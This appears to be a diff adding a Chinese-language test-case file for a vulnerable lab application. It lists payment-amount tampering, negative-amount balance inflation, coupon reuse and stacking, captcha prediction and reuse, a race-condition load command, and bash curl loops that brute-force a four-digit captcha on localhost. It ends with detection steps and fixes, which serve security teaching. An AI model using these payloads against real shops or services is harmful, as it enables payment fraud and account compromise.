@@ -1,0 +1,268 @@
+# 业务逻辑漏洞测试用例
+# 漏洞类型: Business Logic Vulnerabilities
+# 危险等级: 中危 (Medium)
+
+# ============================================
+# 1. 支付金额篡改
+# ============================================
+# 场景: 客户端传来的支付金额直接使用
+
+# 正常支付
+POST /logic/payment?userId=user1&productId=p1&amount=7999.00
+
+# 攻击: 支付 0.01 元购买价值 7999 元的商品
+POST /logic/payment?userId=user1&productId=p1&amount=0.01
+
+# 攻击: 支付负数，增加余额
+POST /logic/payment/signed?userId=user1&productId=p1&amount=-1000
+
+# 攻击: 精度问题（浮点数）
+POST /logic/payment/float?userId=user1&amount=0.00000001
+
+
+# ============================================
+# 2. 优惠券滥用
+# ============================================
+
+# 重复使用优惠券（多次请求）
+POST /logic/payment/coupon?userId=user1&productId=p1&couponCode=SAVE100
+POST /logic/payment/coupon?userId=user1&productId=p1&couponCode=SAVE100
+POST /logic/payment/coupon?userId=user1&productId=p1&couponCode=SAVE100
+
+# 叠加使用优惠券（可能导致免费）
+POST /logic/payment/coupons?userId=user1&productId=p2&coupons=SAVE100,SAVE500
+POST /logic/payment/coupons?userId=user1&productId=p2&coupons=SAVE100,SAVE500,PERCENT20
+
+
+# ============================================
+# 3. 验证码可预测
+# ============================================
+
+# 获取验证码（基于时间戳生成）
+GET /logic/captcha/generate?userId=user1
+
+# 预测验证码（使用当前时间戳后4位）
+POST /logic/captcha/verify?userId=user1&captcha=1234
+
+
+# ============================================
+# 4. 验证码可复用
+# ============================================
+
+# 同一个验证码使用多次
+GET /logic/captcha/generate?userId=user1
+POST /logic/captcha/verify?userId=user1&captcha=1234
+POST /logic/captcha/verify?userId=user1&captcha=1234
+POST /logic/captcha/verify?userId=user1&captcha=1234
+
+
+# ============================================
+# 5. 固定验证码
+# ============================================
+
+# admin 用户使用固定验证码 1234
+POST /logic/captcha/admin?userId=admin&captcha=1234
+
+
+# ============================================
+# 6. 验证码暴力破解
+# ============================================
+
+# 4位纯数字验证码，只有10000种可能
+# 可以使用脚本自动枚举
+for i in {0000..9999}; do curl "http://localhost:8080/logic/captcha/bruteforce?userId=user1&captcha=$i"; done
+
+
+# ============================================
+# 7. 支付绕过场景
+# ============================================
+
+# 场景 1: 修改支付金额为 0.01
+# 原价: 7999.00
+# 支付: 0.01
+POST /logic/payment?userId=user1&productId=p1&amount=0.01
+
+# 场景 2: 负数金额增加余额
+POST /logic/payment/signed?userId=user1&productId=p1&amount=-5000
+
+# 场景 3: 免费购买（叠加优惠券）
+POST /logic/payment/coupons?userId=user1&productId=p2&coupons=SAVE100,SAVE500,SAVE100,SAVE100
+
+
+# ============================================
+# 8. 并发竞态条件
+# ============================================
+
+# 同时发送多个相同请求，可能导致重复消费
+# 使用工具: Apache Bench, wrk, JMeter
+
+ab -n 100 -c 10 "http://localhost:8080/logic/payment?userId=user1&productId=p3&amount=0.01"
+
+
+# ============================================
+# 9. 优惠券叠加攻击
+# ============================================
+
+# 计算最优叠加方案
+# MacBook Pro: 15999
+# SAVE500 + SAVE500 + SAVE500 = 14500 (5个)
+# PERCENT20 (20% off) = 12799.2
+
+POST /logic/payment/coupons?userId=user1&productId=p2&coupons=SAVE100,SAVE100,SAVE100,SAVE100,SAVE100,SAVE100,SAVE100,SAVE100,SAVE100,SAVE100,SAVE100,SAVE100,SAVE100,SAVE100,SAVE100
+
+
+# ============================================
+# 10. 测试流程
+# ============================================
+
+# 步骤 1: 查看用户余额
+# user1 初始余额: 10000
+
+# 步骤 2: 使用负数金额增加余额
+POST /logic/payment/signed?userId=user1&productId=p1&amount=-50000
+# 结果: user1 余额变为 60000
+
+# 步骤 3: 使用 0.01 元购买高价商品
+POST /logic/payment?userId=user1&productId=p2&amount=0.01
+# 结果: 获得 MacBook Pro，仅花费 0.01 元
+
+
+# ============================================
+# 11. 验证码攻击流程
+# ============================================
+
+# 步骤 1: 获取验证码
+GET /logic/captcha/generate?userId=attacker
+
+# 步骤 2: 分析验证码生成模式
+# 观察发现是时间戳后4位
+
+# 步骤 3: 预测验证码
+# 使用当前时间戳后4位
+
+# 步骤 4: 重复使用验证码
+# 同一个验证码可以使用多次
+
+
+# ============================================
+# 12. 自动化攻击脚本
+# ============================================
+
+#!/bin/bash
+# 支付金额篡改攻击
+
+for amount in 0.01 0.05 0.1; do
+  echo "尝试支付: $amount"
+  curl -s "http://localhost:8080/logic/payment?userId=user1&productId=p1&amount=$amount"
+  echo ""
+done
+
+
+#!/bin/bash
+# 验证码暴力破解
+
+for i in {0000..9999}; do
+  result=$(curl -s "http://localhost:8080/logic/captcha/bruteforce?userId=user1&captcha=$i")
+  if echo "$result" | grep -q "正确"; then
+    echo "验证码是: $i"
+    break
+  fi
+done
+
+
+# ============================================
+# 13. 检测方法
+# ============================================
+
+# 方法 1: 参数篡改测试
+# 1. 抓取正常支付请求
+# 2. 修改金额参数
+# 3. 发送修改后的请求
+# 4. 检查是否以篡改金额处理
+
+# 方法 2: 重复请求测试
+# 1. 发送优惠券使用请求
+# 2. 再次发送相同请求
+# 3. 检查优惠券是否被重复使用
+
+# 方法 3: 验证码分析
+# 1. 多次获取验证码
+# 2. 分析验证码模式
+# 3. 测试是否可以预测
+
+
+# ============================================
+# 14. 成功特征
+# ============================================
+
+# 支付篡改:
+# - 支付金额与商品价格不一致
+# - 支付成功但订单金额异常
+# - 负数金额导致余额增加
+
+# 优惠券滥用:
+# - 同一优惠券可多次使用
+# - 多个优惠券可叠加使用
+# - 最终价格低于商品原价
+
+# 验证码漏洞:
+# - 验证码可预测
+# - 验证码可复用
+# - 没有频率限制
+
+
+# ============================================
+# 15. 修复建议
+# ============================================
+
+# 支付逻辑:
+# 1. 服务端验证商品价格
+# 2. 不信任客户端传来的金额
+# 3. 使用 BigDecimal 进行金额计算
+# 4. 验证金额必须为正数
+
+# 优惠券:
+# 1. 记录优惠券使用次数
+# 2. 标记已使用的优惠券
+# 3. 限制优惠券叠加使用
+
+# 验证码:
+# 1. 使用随机数生成验证码
+# 2. 验证后立即失效
+# 3. 设置合理的过期时间
+# 4. 实施频率限制
+
+# 通用:
+# 1. 使用事务保证数据一致性
+# 2. 实施幂等性检查
+# 3. 记录所有操作日志
+# 4. 定期进行安全审计
+
+
+# ============================================
+# 16. 真实案例
+# ============================================
+
+# 案例 1: Uber (2015)
+# - 漏洞: 优惠券可重复使用
+# - 影响: 损失数百万美元
+# - 原因: 服务端未验证优惠券使用状态
+
+# 案例 2: Steam (2015)
+# - 漏洞: 支付金额可篡改
+# - 影响: 用户以低价购买游戏
+# - 原因: 客户端价格未在服务端验证
+
+# 案例 3: 某电商平台 (2019)
+# - 漏洞: 优惠券叠加使用
+# - 影响: 0元购买商品
+# - 原因: 未限制优惠券叠加
+
+
+# ============================================
+# 17. 参考资料
+# ============================================
+
+# - OWASP: Business Logic Vulnerabilities
+# - CWE: CWE-841 (Business Logic Errors)
+# - PortSwigger: Business logic vulnerabilities
